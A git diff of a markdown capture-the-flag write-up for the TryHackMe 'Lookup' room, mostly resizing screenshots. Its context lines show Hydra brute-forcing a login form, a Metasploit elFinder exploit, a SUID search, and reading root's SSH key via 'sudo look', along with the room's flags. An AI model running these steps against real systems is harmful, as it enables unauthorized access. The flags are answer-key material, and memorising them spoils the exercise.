@@ -43,7 +43,7 @@ sudo nano /etc/hosts
 ```
 
 <p align="center">
-  <img src="./images/hosts.png" alt="Hosts File" width="400"/>
+  <img src="./images/hosts.png" alt="Hosts File" width="600"/>
 </p>
 
 ---
@@ -71,7 +71,7 @@ nikto -h http://lookup.thm/ -o nikto_scan.txt
 ```
 
 <p align="center">
-  <img src="./images/nikto.png" alt="Nikto Scan" width="400"/>
+  <img src="./images/nikto.png" alt="Nikto Scan" width="600"/>
 </p>
 
 ---
@@ -81,16 +81,16 @@ nikto -h http://lookup.thm/ -o nikto_scan.txt
 Use Burp Suite Intruder to enumerate usernames:
 
 <p align="center">
-  <img src="./images/browser_intruder.png" alt="Burp Intruder" width="400"/>
+  <img src="./images/browser_intruder.png" alt="Burp Intruder" width="600"/>
 </p>
 
 - Found valid username:
   <p align="center">
-    <img src="./images/username_correct_Burp.png" alt="Username Correct" width="400"/>
+    <img src="./images/username_correct_Burp.png" alt="Username Correct" width="600"/>
   </p>
 - Testing other usernames:
   <p align="center">
-    <img src="./images/username_password_wrong_burp.png" alt="Wrong Username/Password" width="400"/>
+    <img src="./images/username_password_wrong_burp.png" alt="Wrong Username/Password" width="600"/>
   </p>
 
 ---
@@ -104,7 +104,7 @@ hydra -L /usr/share/wordlists/rockyou.txt -p admin lookup.thm http-post-form "/l
 ```
 
 <p align="center">
-  <img src="./images/finding_username.png" alt="Finding Username" width="400"/>
+  <img src="./images/finding_username.png" alt="Finding Username" width="600"/>
 </p>
 
 - Discovered users:
@@ -112,7 +112,7 @@ hydra -L /usr/share/wordlists/rockyou.txt -p admin lookup.thm http-post-form "/l
   2. jose
 
 <p align="center">
-  <img src="./images/found_username.png" alt="Found Username" width="400"/>
+  <img src="./images/found_username.png" alt="Found Username" width="600"/>
 </p>
 
 #### Find Password
@@ -122,7 +122,7 @@ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/lo
 ```
 
 <p align="center">
-  <img src="./images/finding_password.png" alt="Finding Password" width="400"/>
+  <img src="./images/finding_password.png" alt="Finding Password" width="600"/>
 </p>
 
 - **Found credentials:**  
@@ -135,11 +135,11 @@ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/lo
 
 - Login to dashboard:
   <p align="center">
-    <img src="./images/gain_access_dashboard.png" alt="Dashboard Access" width="400"/>
+    <img src="./images/gain_access_dashboard.png" alt="Dashboard Access" width="600"/>
   </p>
 - Found SSH credentials:
   <p align="center">
-    <img src="./images/get_username_cred.png" alt="SSH Credentials" width="400"/>
+    <img src="./images/get_username_cred.png" alt="SSH Credentials" width="600"/>
   </p>
 
 #### Search for Exploits
@@ -149,7 +149,7 @@ searchsploit elfinder
 ```
 
 <p align="center">
-  <img src="./images/find_exploit_elfinder.png" alt="Find Exploit" width="400"/>
+  <img src="./images/find_exploit_elfinder.png" alt="Find Exploit" width="600"/>
 </p>
 
 #### Metasploit Exploitation
@@ -162,7 +162,7 @@ exploit
 ```
 
 <p align="center">
-  <img src="./images/metasploit_exploit.png" alt="Metasploit Exploit" width="400"/>
+  <img src="./images/metasploit_exploit.png" alt="Metasploit Exploit" width="600"/>
 </p>
 
 - Get a shell:
@@ -178,7 +178,7 @@ exploit
   ```
 
 <p align="center">
-  <img src="./images/tmp.png" alt="Tmp Directory" width="400"/>
+  <img src="./images/tmp.png" alt="Tmp Directory" width="600"/>
 </p>
 
 ---
@@ -187,10 +187,10 @@ exploit
 
 - Find SUID binaries:
   ```bash
-  find / -perm -4000 -type f 2>/dev/null
+  find / -perm -6000 -type f 2>/dev/null
   ```
   <p align="center">
-    <img src="./images/finding_vul.png" alt="Finding Vulnerabilities" width="400"/>
+    <img src="./images/finding_vul.png" alt="Finding Vulnerabilities" width="600"/>
   </p>
 
 - Update PATH:
@@ -206,7 +206,7 @@ exploit
   ```
 
   <p align="center">
-    <img src="./images/think_password.png" alt="Think Password" width="400"/>
+    <img src="./images/think_password.png" alt="Think Password" width="600"/>
   </p>
 
 - Check sudo permissions:
@@ -214,7 +214,7 @@ exploit
   sudo -l
   ```
   <p align="center">
-    <img src="./images/sudo_l.png" alt="Sudo List" width="400"/>
+    <img src="./images/sudo_l.png" alt="Sudo List" width="600"/>
   </p>
 
 - Use `look` command for privilege escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/look/)):
@@ -223,7 +223,7 @@ exploit
   ```
   - **User flag:** `38375fb4dd8baa2b2039ac03d92b820e`
   <p align="center">
-    <img src="./images/look.png" alt="Look Command" width="400"/>
+    <img src="./images/look.png" alt="Look Command" width="600"/>
   </p>
 
 - Extract root SSH key:
@@ -231,7 +231,7 @@ exploit
   sudo look "" /root/.ssh/id_rsa
   ```
   <p align="center">
-    <img src="./images/ssh_key.png" alt="SSH Key" width="400"/>
+    <img src="./images/ssh_key.png" alt="SSH Key" width="600"/>
   </p>
 
 - Copy SSH key to your machine:
@@ -240,7 +240,7 @@ exploit
   chmod 600 id_rsa
   ```
   <p align="center">
-    <img src="./images/ssh_key_m_machine.png" alt="SSH Key on Machine" width="400"/>
+    <img src="./images/ssh_key_m_machine.png" alt="SSH Key on Machine" width="600"/>
   </p>
 
 - SSH as root:
@@ -248,12 +248,12 @@ exploit
   ssh -i id_rsa root@files.lookup.thm
   ```
   <p align="center">
-    <img src="./images/root_access.png" alt="Root Access" width="400"/>
+    <img src="./images/root_access.png" alt="Root Access" width="600"/>
   </p>
 
 - **Root flag:** `5a285a9f257e45c68bb6c9f9f57d18e8`
   <p align="center">
-    <img src="./images/root_flag.png" alt="Root Flag" width="400"/>
+    <img src="./images/root_flag.png" alt="Root Flag" width="600"/>
   </p>
 
 ---
@@ -281,11 +281,13 @@ exploit
 ---
 
 ## 🎉 Happy Hacking!
-
 <p align="center">
-    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
-        <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjc2ZjJub3Vpa2xhMHhiYnRqcnd4NDVmdm85YzJ0aWhmbTUzOWpqdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/78XCFBGOlS6keY1Bil/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
-    </a>
+  <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
+    <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExc2Jsb2hnaTdhNWN0amh1MDc2M3o3bHRrODdiZW9qZWY4cnF6ejFnMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/mQG644PY8O7rG/giphy.gif" alt="Charlie Hunnam GIF" width="600"/>
+  </a>
+</p>
+
+<p align="center"><strong>I did it!</strong></p>
 </p>
 
 ---
